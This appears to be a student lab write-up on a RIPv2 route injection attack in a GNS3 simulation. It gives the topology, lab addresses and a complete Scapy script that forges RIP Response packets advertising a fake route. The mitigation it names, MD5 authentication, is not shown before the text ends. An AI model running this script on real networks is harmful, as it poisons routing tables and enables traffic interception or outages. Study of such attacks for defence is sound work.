# RIP Route Injection Attack & Mitigation

**Authors:** Karolina Graf, Yuliia Lesyk, Mylana Herasymenko  
**Project Type:** Network Security / Routing Protocols  
**Tools Used:** GNS3, Kali Linux, Scapy (Python), Wireshark, Cisco IOS

---

## Project Overview
This project demonstrates a vulnerability in the **Routing Information Protocol (RIP)** known as **Route Injection**. RIPv2, in its default configuration, does not require authentication, making it susceptible to spoofing attacks.

The project is divided into three main phases:
1.  **[span_0](start_span)Topology Setup:** Configuring a network with 5 routers and end devices using GNS3.[span_0](end_span)
2.  **[span_1](start_span)Attack Execution:** Using a Kali Linux VM to inject false routing information via a Python Scapy script.[span_1](end_span)
3.  **[span_2](start_span)Mitigation:** Securing the network by implementing **MD5 Authentication**.[span_2](end_span)

---

##  Network Topology
The simulation was conducted in **GNS3** using the following components:
* **Routers:** R1, R2, R3, R4, R5.
* **Attacker:** Kali Linux VM connected to the `10.1.3.0/24` network segment.
* **Victim Network:** The entire RIP routing domain.

**Key Addresses:**
* **[span_3](start_span)Attacker IP (Kali):** `10.1.3.11`[span_3](end_span)
* **[span_4](start_span)RIP Multicast Address:** `224.0.0.9`[span_4](end_span)
* **[span_5](start_span)[span_6](start_span)Injected (Fake) Route:** `10.1.4.0/24` with Metric 1[span_5](end_span)[span_6](end_span)

---

##  The Attack: Route Injection

### Methodology
The attack involves sending forged RIPv2 "Response" packets to the multicast group. The router receives these updates and, believing they come from a legitimate neighbor, adds the fake route to its routing table.

### 1. Python Injection Script (Scapy)
The following script was used to generate the malicious packets:

```python
#!/usr/bin/env python3
from scapy.all import *

# Attack Configuration
SOURCE_IP = "10.1.3.11"      # Attacker's IP
DEST_IP = "224.0.0.9"        # RIP Multicast
FAKE_NET = "10.1.4.0"        # The fake network we are advertising
METRIC = 1                   # Low metric to ensure route preference

# Constructing the Malicious Packet
pkt = Ether(dst="01:00:5e:00:00:09") / \
      IP(src=SOURCE_IP, dst=DEST_IP) / \
      UDP(sport=520, dport=520) / \
      RIP(cmd=2, version=2) / \
      RIPEntry(AF="IP",
               RouteTag=0,
               addr=FAKE_NET,
               mask="255.255.255.0",
               nextHop="0.0.0.0",
               metric=METRIC)

# Sending packet in a loop
sendp(pkt, loop=1, inter=2, verbose=1)
